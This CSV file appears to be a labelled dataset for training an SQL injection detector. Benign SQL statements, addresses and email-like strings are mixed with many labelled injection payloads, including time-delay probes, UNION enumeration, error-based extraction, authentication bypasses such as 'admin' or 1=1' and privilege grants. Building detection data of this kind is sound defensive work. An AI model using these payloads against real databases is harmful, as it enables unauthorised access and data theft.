Query,Label
spain@erasmusrooms.bi,0
pangborne@europop.mw,0
SELECT * FROM sky WHERE such NOT LIKE 'pitch%',0
guadiana 149 6f,0
es3regamiento,0
"SELECT COUNT ( using ) , instrument FROM breeze BY widely",0
"SELECT * FROM own ORDER BY highest, improve",0
1%'  )	) )  or sleep(	5		)and		(	(	 (	 '%' = ',1
SELECT DISTINCT citizen FROM everywhere,0
prdena del rincn,0
"1""	)	andmake_set( 4553  =	8132,8132 )	and (	""pfci""	like""pfci",1
"-3637"" or(	8459	=	8459	)	*4906",1
SELECT MIN ( condition )  AS sand FROM tent,0
9.84215E+15,0
"1%') 	 )		) or8514	=	 benchmark	(5000000,md5(  0x544d5a4c		) 	)#",1
henry@sms24h.tr,0
DELETE FROM tight,0
"1	)	andmake_set  (4593		= 	7765,7765		)and	 	(  8517 = 8517",1
SELECT * FROM teeth WHERE NOT primitive = 'shown'  AND NOT know = 'which',0
SELECT MIN ( wish )  AS wolf FROM ear,0
song@eyewear.nom.aw,0
desc,1
"UPDATE newspaper SET wherever =  'unit', City =  'captured' WHERE went =  slight",0
selectpg_sleep(5)		and			(	 	 (  ( '%'		=	',1
hodos@926.fr,0
"-8777""	)	aslalf	where8606 =8606 or elt (4397	 =	 5823,5823  )	--",1
"-7637""union allselect8498,8498,8498--",1
1'  )	)	  )		and	(select	*from (	select	(	sleep (	5		)  )  )gcrr  )#,1
SELECT * FROM private,0
"1""	or4915=  (selectcount		(*	)	from domain.domains	as t1,domain.columnsas	t2,domain.tablesast3		)	--",1
"SELECT here, organized+ ', ' + claws+ ' ' + teacher+ ', ' + respect AS count  FROM leaf",0
SELECT gasoline,0
SELECT COUNT ( ProductID ) FROM Products;,0
"1)			) 	or char  ( 119	)	||char	( 	100  )||char 	(  99 )		||char	 (	 121 ) =  regexp_substring	( repeat  (	right (char (	1441 ),0		)	 ,5000000000	)		,null ) --",1
1' )  )			asdcenwhere5852  =5852or			(select *from	(	 select (	sleep( 5	)		 ) 	  )ydpu )	--,1
agustn,0
65119692e,0
"1		) )	 asbebl where2597		=2597	  ( select	(	casewhen (		5451= 5451)	thenregexp_substring	( 	repeat	(	 right( char	( 	5451 )	,0	 ) ,500000000 )		,null )		else	char	( 108) ||char 	( 76 )  ||char (112		)	||char(	116		)	 end )	frominformation_schema.system_users ) 	--",1
-8274')	)	  unionallselect 3048--,1
folsom_talli@esteticadayda.tel,0
weld@yiutuve.vc,0
5106,0
5on39taci19,0
1)		 where9167		=		9167,1
SELECT AVG ( over ) FROM court,0
"SELECT column_name ( s )  FROM tube,would",0
"select	*	fromusers	whereid =1 or ""%?""or1 =	1 -- 1",1
"1	) 		(	select ( case when	(	4587= 	4587 	) then	regexp_substring (	repeat( left		(	crypt_key( char(  65	)  ||char	(	69)||char	( 83 )	 ,null)  ,0	 ) ,500000000 	)	 ,null 	)		elsechar(76	)||char(	65)||char	(	102)||char	(72) 	end) 	from 	(	 values(0)	 )  )",1
waitfor	delay'0:0:5'and ( 		( 	('ozjl'like	'ozjl,1
"1""where2886  = 2886",1
yalile,0
"1')  ) )	or	8384	= like('abcdefg',upper ( 	hex	 (randomblob  (	 500000000/2 )	)	 )	)		 and  ( 	(		 ( 	'iari'	= 'iari",1
-7404'	where1536=1536orderby 1#,1
SELECT * FROM ourselves WHERE sad = 'select' LIMIT 3,0
"1""	 )	  as	ucexwhere 5148 	=5148orderby 1#",1
"gredos, 114 12?g",0
SELECT AVG ( poem ) FROM roof SELECT SUM ( production ),0
46160431y,0
-2929' )	 )   	 )			or5903 =	  (	'qqpjq'||(	 select	case5903	when5903then 1else0end	from	rdb$database	)	||'qzvzq' )		and	( (	 	('nzmk'	 ='nzmk,1
loudiadi,0
3.55661E+15,0
"SELECT column1 , column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;",0
SELECT political FROM kitchen UNION ALL SELECT fighting FROM ancient ORDER BY center,0
"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )",0
07951538r,0
SELECT COUNT ( movieID ) FROM each,0
ar2e5tad6,0
fraser,0
SELECT * FROM organized WHERE book NOT LIKE '[announced]%',0
ulf,0
"select* from	users where id =1unionselect1,banner	from v$version where	rownum = 1--1",1
"1'	where6853= 	6853orexp(~	 (	select	*from (		selectconcat(	0x7171706a71,(select  (	elt(		6270	=	6270,1 )				) 	)	,0x717a767a71,0x78	 	)  )	x) )	--",1
SELECT * FROM essential WHERE    NOT enemy = 'gravity',0
1.86E+15,0
SELECT process,0
av. carlos marx s/n,0
ammiel,0
1.07544E+15,0
SELECT * FROM experiment WHERE foot LIKE '%store%',0
5.34929E+15,0
"1	and9254	=	( select count(	* ) 	from rdb$fieldsast1,rdb$typesas t2,rdb$collationsast3,rdb$functionsast4 )--",1
SELECT tower FROM four UNION ALL SELECT stop FROM allow ORDER BY memory,0
"select	*fromuserswhere	id	=	1 +	@<@#	union	selectnull,version	(	 )	--	1",1
"1""where	4082 = 4082andelt	(5699  =	1432,1432	) --",1
1'	) and6969	=		( select	6969frompg_sleep( 	5 	)  )		and		( 'ayol'	= 'ayol,1
valle de yerri/deierri,0
9.61016E+15,0
09352334m,0
"selectpg_sleep (		5 )	and( (  	( ""wqeb"" =	""wqeb",1
SELECT * FROM language WHERE yourself = 'goose'  OR smoke = 'being',0
"select *from	users	whereid	=	 1	or	""{%""or1 =	1--1",1
"1'||( select 'hrpa'where1973	 =1973union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM cannot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM itself,0
ajmet,0
UPDATE thread SET tool = 'surprise'WHERE fighting = 'clothes',0
"select* fromusers	whereid	=  1or	1#""? union select version  (    )  ,version  (    )   -- 1",1
"SELECT trunk,bare,speak FROM mirror LEFT JOIN Orders ON leader.streamID =  species.hearing ORDER BY feel.anything",0
inmol4dor,0
"1""	) 	)		 as tgwp	where 9405	= 9405",1
"1%')		)	or5356	= (select count	(*	) fromsysusersas	sys1,sysusersassys2,sysusers	as	sys3,sysusersas	sys4,sysusersassys5,sysusers as	sys6,sysusers	as sys7	)--",1
"1"")  where3943	=		3943and 8312=		dbms_pipe.receive_message	( 	chr (69)  ||chr (79	)	||chr	(101 ) ||chr (		68	)	,5 )--",1
rowen,0
SELECT AVG ( guide ) FROM sentence SELECT SUM ( region ),0
SELECT * FROM stuck WHERE related = 'serious'  AND City = 'former',0
SELECT AVG ( Price ) FROM Products;,0
1		) 	) 		 asrvexwhere	3462 =3462 and	4595	= 4595#,1
48552,0
"1		)	)	and	char (		111	)	||char(	77  )	 ||char ( 121  )	||char		(	88)	 =	regexp_substring	 (	repeat	( 	left  (crypt_key( char ( 65		) ||char	( 69		)	||char	( 	83 )	,null 	),0)	,500000000	)	,null) and	(	 (	8867 =	8867",1
34306,0
1  ) 	where9307=	9307,1
UPDATE long SET list = 'choice'WHERE fierce = 'strong',0
lazure,0
6.20415E+15,0
"1' )  )  	asfwxq	where	9935	=	9935	orexp	(	~(select* from	( selectconcat	( 0x7171706a71,	(	select		(	elt( 6270 = 6270,1	 )  )	)	,0x717a767a71,0x78)  	) x		 )	) --",1
SELECT TOP 3 * FROM become,0
"SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID WHERE LastName  =  'Davolio' OR LastName  =  'Fuller' GROUP BY LastName HAVING  COUNT ( Orders.OrderID )  > 25;",0
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM from,0
6egas0a,0
ninon,0
"1'where1230 =1230	orchar	(	75	 )||char (70) ||char	( 99 )||char  (	83)  =regexp_substring ( repeat 	(	 left	(crypt_key(	 char	(	65	) ||char	(	69) ||char		(		83	)	 ,null	 )	,0	 ),500000000 	)	,null )	--",1
1union all	select null#,1
SELECT * FROM local WHERE    NOT winter = 'region',0
morrin,0
33120,0
"1""		))  )	rlikesleep	(5	)and		(	(		( ""qcqx""like	""qcqx",1
02906029w,0
"UPDATE coach SET block =  'score', City =  'hardly' WHERE anywhere =  completely",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c885367717' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
stadler_munks@chevrolet-volt.at,0
SELECT CURTIME (  ) ;,0
torrejn de ardoz,0
1 	) 		) 		)		waitfor delay'0:0:5'	and  ( (	( 	3481=	3481,1
"1'  )	  ) 	 )		and5556=  (	selectcount (  *)  fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5	)and (	 (			('msol'	= 'msol",1
6.87721E+15,0
SELECT MIN ( swim )  AS evening FROM breathe,0
"1'|| (		select	'zbdv'	where 1618		=	1618 or	exp 	(~ 	(select *from  	( 	select	concat (  0x7171706a71, (  select	(elt ( 6270	=	6270,1	 ) 	)  		 ),0x717a767a71,0x78  )  	)x)	)	 	 ) 	||'",1
"selectcount	(  * 	)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5	and 	 (  (  'zdkn'=	'zdkn",1
priestley@stockdefotos.vu,0
"virgen de los imposibles 162,",0
select( case	when	( 	9619		=	8679)	 then1	else9619*( 	select	9619frommaster..sysdatabases )	end	)	--,1
"paseo constitucion, 10,",0
SELECT * FROM command WHERE north = 'ear',0
sobrecogimiento,0
SELECT * FROM environment WHERE Price NOT BETWEEN 10 AND 20,0
SELECT RAND (  ) ;,0
SELECT TOP 3 * FROM instant,0
"1%' 	))	    )	andmake_set	 ( 1543 = 5817,5817		)and ((( 	'%' =	 '",1
murillo el cuende,0
FROM  ( SELECT DISTINCT dull FROM basic ),0
"calle andres mellado, 83, 12-d",0
"1'+	(	select ounb	where 4653 =4653or	exp  (	~		(	 select	* from	(selectconcat		(  0x7171706a71,(	select  (		elt(	6270 =	6270,1		)	) ) ,0x717a767a71,0x78 )		 )x		)		)  	)	 +'",1
76150645z,0
SELECT Count ( * )  AS company,0
SELECT * FROM continent WHERE before IN  ( SELECT struck FROM name ),0
pifiar,0
"select	count  (		* ) 	fromrdb$fieldsast1,rdb$types	as	t2,rdb$collations	as	t3,rdb$functionsas	t4and 	(  	( 'rkoe'=	'rkoe",1
SELECT * FROM slept,0
"1%"" )		)and	6240	=  		('qqpjq'||	( select case 6240 when	6240	then 1else0	endfrom rdb$database )	||'qzvzq')	 and 	 	(  	( ""%""=  """,1
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ),0
olaf,0
SELECT * FROM excitement WHERE independent LIKE '%position%',0
"1%""	and5411=	7697	and""%""	 =	""",1
SELECT rose ( s FROM own RIGHT JOIN,0
1	 ) 	  )	  as	izvy where2569=  2569,1
"c/ bellavista, 70 10h",0
1'|| ( 	select'svnn'fromdual	where8710  = 8710,1
SELECT * FROM ranch WHERE instead = 'gas'  OR travel = 'variety',0
"urbanitzacio las lomas, 18, 4a",0
7965,0
"1%'			)		 ) 		)	 or5356	=	 (selectcount (*		)fromsysusersas sys1,sysusers	assys2,sysusersas sys3,sysusers	as sys4,sysusersas	sys5,sysusersassys6,sysusersas	sys7  )	--",1
malott,0
"1""	 ) 	where 1410=	1410",1
"1,(	select		( 	case when(  1255	=	 8025 )  then 1else1255*	 (  select1255frommysql.db	)		end )	   )",1
SELECT COUNT ( earID ) FROM leave,0
"1""		) 	and8312  =		dbms_pipe.receive_message (	 chr 	(	 69 ) ||chr(79	)	||chr  (  101) ||chr	( 68	 ) ,5 )--",1
"admin""or	1=1/*",1
caaveruelas,0
"SELECT eatID AS ID, all AS hot FROM earlier",0
"1"") )		as frsdwhere 6475	 =  6475 union allselect null,null,null,null,null,null,null,null,null,null--",1
18858,0
"SELECT information,characteristic,ask FROM door LEFT JOIN Orders ON screen.liftID =  car.angry ORDER BY buried.got",0
"SELECT rateID AS ID, avoid AS recall FROM rice",0
SELECT COUNT ( DISTINCT park )  FROM someone,0
34964894h,0
carretera 200 hasta km. 1 barra de mio 175,0
SELECT main,0
SELECT * FROM safe WHERE active = 'plural' LIMIT 3,0
"selectcount	(  *	 )from	rdb$fields ast1,rdb$typesas t2,rdb$collations	ast3,rdb$functionsast4	and 	('%' = '",1
"SELECT nutsID AS ID, scientist AS orbit FROM quick",0
SELECT * FROM tribe ORDER BY river,0
"1' and6055 =ctxsys.drithsx.sn	(	6055, (chr	(  113 ) ||chr  (	113		) ||chr (	112	 ) ||chr	 (	106	)  ||chr (113 )  || ( select	 (case	when 	( 6055 = 6055	)then	1	else0end )from dual	)||chr(113 ) ||chr		(122)||chr  (  118	)	||chr 	( 	122	)		||chr  (	113	)	  ) 		 ) 	and'cxor'  = 'cxor",1
SELECT feet ( s )  FROM spirit SELECT instant FROM pay,0
"SELECT * FROM suggest ORDER BY bark, branch",0
SELECT TOP 3 * FROM pile SELECT * FROM sad 3SELECT * FROM family,0
SELECT applied ( s )  FROM suggest FULL OUTER JOIN,0
"SELECT volume, motor+ ', ' + comfortable+ ' ' + dollar+ ', ' + plus AS cowboy  FROM could",0
estic o'neil,0
1'||(select'qstz' where 6835= 6835,1
FROM  ( SELECT DISTINCT tongue FROM settle ),0
admin'	)		or'1'	 = '1'--,1
SELECT wheel FROM taken UNION SELECT grandmother FROM until ORDER BY colony,0
"SELECT afterID AS ID, having AS fruit FROM partly",0
"SELECT POW ( 4, 2 ) ;",0
SELECT AVG ( choose ) FROM tube SELECT SUM ( judge ),0
"SELECT * FROM title WHERE captured NOT IN  ( 'addition', 'cookies', 'previous' )",0
SELECT high ( s )  FROM snake UNION ALL,0
"select* fromusers	whereid ='1'	||1unionselect	1,bannerfromv$versionwhererownum	 =1 -- 1'",1
SELECT * FROM check WHERE locate NOT BETWEEN 'increase' AND 'experience',0
SELECT * FROM bound WHERE magnet = 'nearly' FETCH FIRST 3 ROWS ONLY,0
"INSERT INTO medicine  ( expression, sides, everything )  VALUES  ( 'wore', 'travel', 'rice' )",0
SELECT setting ( s ) FROM what INNER JOIN,0
"1"" )	 	where3122=	3122 andsleep	(5	) #",1
SELECT * FROM mass WHERE mental NOT LIKE '[mysterious]%',0
UPDATE tiny SET follow = 'tight'WHERE return = 'rocky',0
SELECT * FROM consonant WHERE using LIKE '%book%',0
"errekerte 113,",0
SELECT COUNT ( fish ) FROM wonderful,0
75106972n,0
8.85119E+15,0
"call regexp_substring	 (repeat		(	 left	( crypt_key	(char	( 	65 ) ||char	(	69 )	||char	(	 83) ,null ),0 )	,500000000 )  ,null	 )  and 		(  	(""pawh""= ""pawh",1
"select	*from	userswhere id =	1or 1#""@ union select null,version  (    )   -- 1",1
beaumont@lasmilyuna.gi,0
"-7737'||(select	'xalo' where	9219	 = 9219union	all select 9219,9219,9219,9219#",1
or	isNULL	 (1/0	)  /*,1
SELECT MIN ( wooden )  AS sight FROM valuable,0
SELECT AVG ( say ) FROM shirt SELECT SUM ( desert ),0
san vicente de la cabeza,0
-4363%' 	)	)	)or5903= ( 	'qqpjq'||  (select case5903when	5903then	1 else0	endfrom	rdb$database ) ||'qzvzq'	)  and	(  (  ('%'	= ',1
re9a3io,0
SELECT MIN ( partly )  AS usually FROM combination,0
"c/ madre castisima, s/n",0
SELECT * FROM soon,0
yoel,0
brazzel1@castigadas.am,0
SELECT * FROM difficult  WHERE question = torn,0
"-7065'+	(select 'bdxr'where1756= 1756	union allselect	1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",1
"SELECT * FROM Customers  WHERE Country IN  ( 'Germany', 'France', 'UK' ) ;",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 290914 )  ORDER BY meta_id ASC",0
leuco vilca,0
SELECT * FROM  ( SELECT hunt FROM shelf ),0
18708,0
"1""	and3715in (  ( 	char (113  ) 	+char(113	)	 +char  ( 112	)+char( 	106 ) +char( 113 )	+	(select	(	casewhen (3715 = 3715)thenchar	(49) elsechar( 	48		)	 end  )	 )	+char (	113	)	+char(	122	) 	+char  (  118 	) +char (122	) +char	(  113 	) 		)	  	)		and""vziz""	= ""vziz",1
"1'where 9241  =9241or	4915	 = 	(select count (	*)		from domain.domains	as t1,domain.columnsast2,domain.tablesas	t3 )--",1
"1""  ) 		) 		 )	or 8466=		benchmark (  5000000,md5 (0x694a4745  )	 )	and  ((  (""hiwo""like""hiwo",1
"selectcount( *	)		fromgenerate_series (		1,5000000	)  and(	'qpdu'	='qpdu",1
or	2between1 and 3,1
5348,0
SELECT * FROM pull FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%'	)  	))  	union allselect null,null,null,null,null,null,null--",1
or''-',1
SELECT TOP 3 * FROM has WHERE frequently = 'slipped',0
AND	1	 = utl_inaddr.get_host_address	 (	 (	SELECT	global_nameFROMglobal_name )	  ) AND'i'	=	'i,1
SELECT * FROM whatever WHERE writer IN  ( SELECT noise FROM damage ),0
"1%""		) )		 ) and6537=  dbms_pipe.receive_message	(	chr( 76 	)||chr	(	116	)	 ||chr( 117 )	||chr(	65		),5		)	and  	 (	(		(	""%""	= """,1
orea,0
select		( 	case	when 	 ( 5203	=	6330	) then5203else5203* (select 5203frommysql.db	 )	  end )	 #,1
SELECT * FROM wife WHERE split IN  ( SELECT rise FROM good ),0
"1' in boolean mode)	 	and6510	=	 (		select count (	*)		from sysusers as sys1,sysusers as sys2,sysusersas	sys3,sysusersas sys4,sysusersassys5,sysusers assys6,sysusers	assys7 )	#",1
"SELECT * FROM choose ORDER BY finger, entirely",0
registro,0
"c/ los rosales 166, 6f",0
"SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0
SELECT * FROM getting 3,0
milton@diagnosticoradiologico.asia,0
SELECT * FROM card WHERE library = 'share'  OR himself = 'course',0
"-6333"" 	)	 )		  	)  unionallselect 9851,9851,9851,9851,9851,9851--",1
SELECT base ( s )  FROM better UNION,0
SELECT AVG ( notice ) FROM sets,0
"INSERT INTO simple ( darkness, ice, joy, loose, instead, settle )  VALUES  ( 'scale', 'clean'. therefore', 'necessary', 'want', 'loss', 'earn' )",0
SELECT scientist FROM purple UNION ALL SELECT period FROM industrial ORDER BY doll,0
bascuana de san pedro,0
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair',0
"SELECT * FROM young WHERE happily NOT IN  ( 'flower', 'whose', 'within' )",0
1'	 )	where8086	=8086	and 1430 =	7941--,1
"SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL",0
terhune@multireform.tn,0
"1'		) )			)and 8312 	= dbms_pipe.receive_message	( chr ( 69  )||chr		(	79  ) ||chr	( 	101	)	||chr ( 	68) ,5) 	--",1
grantconnect	to	name;grant	resource toname;,1
15807509t,0
"SELECT MONTHNAME ( ""2017-06-15 09:34:21"" ) ;",0
admin' ) 	or(	'1'	= 	'1'/*,1
"-6747"" or	9323	=9323#",1
1 ) 	 where7729	=7729,1
SELECT * FROM sport WHERE joy  BETWEEN 10 AND 20,0
"select	dbms_pipe.receive_message  ( chr	 (	66	)		||chr	( 67)	||chr(79  )  ||chr( 101 )	,5	 )	fromdual	and( 		( 		 ( ""oiuw""=	""oiuw",1
barcones,0
SELECT * FROM dirty WHERE fellow  BETWEEN 10 AND 20,0
SELECT * FROM breeze WHERE night = 'box' FETCH FIRST 3 ROWS ONLY,0
"-4379'unionall select1648,1648,1648,1648,1648,1648,1648#",1
1' ) )	 	rlike	( select		 (	 casewhen(	7689=	7689) then	1	else0x28	end		)  )	and	(		(  	'ltki'	 =	'ltki,1
if	 (  5316		=	 4416 )  	select5316elsedropfunction vtve--,1
lahnstein agundis,0
SELECT * FROM wing FETCH FIRST 50 PERCENT ROWS ONLY,0
"SELECT * FROM glass ORDER BY rabbit ASC, lay DESC",0
"1'where2202 = 	2202	and 2716=(	selectcount	(  * )	from	sysusers	as	sys1,sysusersas	sys2,sysusers	assys3,sysusers as sys4,sysusers assys5,sysusersassys6,sysusers assys7	 ) --",1
SELECT COUNT ( die )  FROM syllable,0
SELECT TOP 3 * FROM wait WHERE electric = 'southern',0
SELECT AVG ( duck )  FROM box  SELECT SUM ( triangle ),0
"c/ venus 91, 1e",0
(select*from 	(	select ( sleep ( 5	)		  )			)srmq	)and		 (	(  4982	=4982,1
SELECT * FROM clothes WHERE local IN  ( SELECT fresh FROM heavy ),0
SELECT * FROM dog 3 SELECT * FROM gave,0
"-1772		)		)	 or 1570=convert	(int,( selectchar(  113	)+char  (	113	)	 +char 	( 112 	)  +char 	( 106  )	+char 	(113  )	+ (select (casewhen		( 1570	 =1570 )  	then char(49  )	elsechar 	(	48 )			end	)		 )+char(113	)  +char (  122	) +char (118	)		+char	(122 )		+char		(  113  )		) 	 ) 	and 	(		(		8904 	=8904",1
SELECT AVG ( Price ) FROM lucky,0
cristaldo marchan,0
brittani,0
8589,0
"-4318"") 	as vpvt	where5543	 = 5543 union	all select5543,5543,5543,5543,5543,5543--",1
"1""where	4298  = 4298 order	by1--",1
1' )  or6793		=		( select 6793frompg_sleep ( 5  )  	),1
SELECT * FROM pain WHERE stay BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM brain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM shadow,0
"alfalfa 47,",0
"1""	)or	5286 	= (	select count(	*	)	from	all_userst1,all_userst2,all_users	t3,all_userst4,all_userst5 )  and(		""oxxi""=	""oxxi",1
SELECT * FROM rhythm WHERE strength = 'widely'  AND City = 'supply',0
"SELECT COUNT ( heard ) , floating FROM harder BY difficult",0
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM catch,0
SELECT scientist ( s )  FROM shop SELECT author ( s ),0
1'|| (select'xugb'fromdual where6772  =	 6772,1
83677248m,0
"-6778)	 as xutm	where6442 =6442unionallselect	6442,6442,6442,6442,6442,6442#",1
9ar5i04o,0
-4954'	)	 or8571 	=	 8571--,1
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,0
1'where 7725		= 7725 or  ( select*from	  (	 select ( sleep( 	5 )	)	  ) sddo	) #,1
SELECT * FROM near ORDER BY zipper,0
broquel,0
dirck,0
"1%"" 	)		 and	sleep 	(	5) #",1
"1%""  	) )	 )	 and 3715in (   ( char(	113 	)	+char		(113 	) +char (	112)		+char(	 106) +char (		113	 )	+ (		select	( 	case when	(	3715  =  3715)		thenchar	(		49	)	else	char( 48 )	 end)	 ) +char 	( 113 )	 +char(	122) +char 	(118)	+char (122)	+char	( 113)  	)	  )	and  (	 ( 		(""%""		=""",1
SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain,0
SELECT AVG ( feature ) FROM wheel SELECT SUM ( one ),0
7986,0
1	) 		) rlikesleep(5	) #,1
"1  	)	) 	)	 orchar( 75	 ) 	||char ( 70 ) ||char( 99)||char	( 83)=  regexp_substring 	( repeat(	left	( crypt_key		(		char	(	65  )||char	 (  69 )	||char	 (83	) 	,null ),0 ) ,500000000	)	 ,null 	)	--",1
SELECT * FROM famous WHERE enter NOT LIKE '[song]%',0
DELETE FROM stiff,0
16824275m,0
26527823z,0
"1%""	))		 and 2716 = 	 (select	count (	*)from sysusers as sys1,sysusersas sys2,sysusersassys3,sysusersas	sys4,sysusers	assys5,sysusers as	sys6,sysusersas sys7 )	--",1
1capa2ad*or,0
1 )where1402  = 	1402,1
"-1583'	)	 or	elt	(	1032		= 1032,3623	) 		and	 (		'jrcj' like 'jrcj",1
FROM  ( SELECT DISTINCT tool FROM coffee ),0
SELECT * FROM question WHERE car = 'yard' FETCH FIRST 3 ROWS ONLY,0
"ignacio aldecoa, 30, 6h",0
v9n939z6,0
SELECT COUNT ( go ) FROM throat,0
"1' 	)	as xvcr	where 6456	= 6456 and3824	=benchmark	(	 5000000,md5(		0x76555642		)	) 		--",1
SELECT Count ( * )  AS wish,0
"1""	)	 )	 		asxtltwhere	9293=	 9293",1
SELECT * FROM teacher WHERE half IN  ( SELECT balance FROM prepare ),0
SELECT AVG ( is ) FROM happy,0
SELECT * FROM even,0
"1%""	)		 and9764 =  6037	and	 (  ""%""=""",1
"1""	)  as ltoa where	9159=		9159	or exp	( ~ ( select* from	(	 select concat(	0x7171706a71,(	select 	(elt	(	6270 =6270,1 )		)	)	 ,0x717a767a71,0x78	) )  	x) 		) 		--",1
"1) asqjbdwhere2808 =  2808	(select  (casewhen ( 5451 = 5451 	) thenregexp_substring( repeat( right	(	char		(  5451)  ,0  )		,500000000	)	,null		)	 elsechar(	108 	)		||char ( 76	)||char	(	112	)  ||char(116 )	 end		)	frominformation_schema.system_users	)--",1
"1"" 	) )union allselect null,null,null#",1
"SELECT Employees.almost, COUNT ( Orders.largeID )  AS miceFROM    ( OrdersINNER JOIN powerful ON Orders.dishID  =  Employees.didID )",0
DELETE FROM clothes WHERE string = 'sail',0
SELECT TOP 3 * FROM several WHERE stomach = 'letter' SELECT * FROM any,0
"1'|| (	 select'lpej'	from dualwhere8294	=8294or   (	select 9173from 	( selectcount	(*) ,concat		(0x7171706a71,(	select	( elt	 (9173 =	9173,1		) 	)		)	,0x717a767a71,floor	(rand( 	0	) *2  )  )	x	from information_schema.character_setsgroupbyx )	a		 ) )  ||'",1
"1%""	 )	)   )	and	3116=	 9088#",1
"1'+	( select	'zxxh'where4065=4065and8635	=	 		( 	selectcount 	(		*  )from	generate_series 	(	1,5000000	 ) 	) 	--",1
"1' ) 	asrvch where1863	 = 1863 or8384=  like (	'abcdefg',upper(hex ( randomblob ( 500000000/2  ))	 	)		 	) 	--",1
"SELECT floating,travel FROM sand WHERE feed = 'quickly' UNION SELECT shinning, me FROM declared",0
SELECT TOP 3 * FROM doubt SELECT * FROM now 3SELECT * FROM chamber,0
"-5957	 ) ) 	)  union	allselect8485,8485,8485,8485,8485,8485,8485,8485,8485--",1
"SELECT Employees.ought, COUNT ( Orders.memberID )  AS lawFROM    ( OrdersINNER JOIN dig ON Orders.storeID  =  Employees.excellentID )",0
SELECT TOP 3 * FROM sense WHERE rhythm = 'average' SELECT * FROM meet,0
-6588'where 7793	=	7793	or		(8459 = 8459	)	*4906--,1
1'||	( select	'oxas'	from dual	where	8284=	8284	or sleep (5	)		)		||',1
"1')			)   	)  and	6537		= dbms_pipe.receive_message	 ( chr	 ( 76	)||chr (		116 )	||chr	(117		)  ||chr( 	65	)		,5) and 	 (  (	( 'xngr' ='xngr",1
19219,0
SELECT QUARTER ( CURDATE (   )  )  ;,0
1where4003 	= 4003union all	selectnull--,1
SELECT * FROM complex WHERE one LIKE '%cut%',0
SELECT * FROM forward WHERE bark = 'express',0
"1"")   ) and	6486	=3843 and   (	(	""fbka""	like""fbka",1
"1""where5552=	5552or5356=	(select count ( *  )	fromsysusersassys1,sysusersas sys2,sysusersassys3,sysusers as	sys4,sysusers as sys5,sysusers assys6,sysusersassys7)--",1
SELECT Count ( * )  AS favorite,0
"1"" )	procedureanalyse	( 	extractvalue	 (	 9255,concat	(	 0x5c, 	(	 benchmark (		5000000,md5	(0x52515a50 ) 	)		)  ) 			),1	)and   (""smhd""	like ""smhd",1
98538229l,0
"SELECT * FROM half WHERE excitement IN  ( 'neighbor', 'blanket', 'meant' )",0
SELECT COUNT ( queen ) FROM exist,0
1' ) where7903	=7903,1
castilla s/n,0
SELECT * FROM  ( SELECT bridge FROM system ),0
"SELECT ProductName, UnitPrice *  ( UnitsInStock + COALESCE ( UnitsOnOrder, 0  )  )   FROM Products;",0
1') as jrqhwhere 6204 = 6204and   (select*from (		select(  sleep	(		5) 	) )gcrr		)		#,1
end#ckxq,1
"1'	and 3707 =  (	select count	(* )			fromsysibm.systablesas	t1,sysibm.systablesast2,sysibm.systablesast3)		and'bxjo' like'bxjo",1
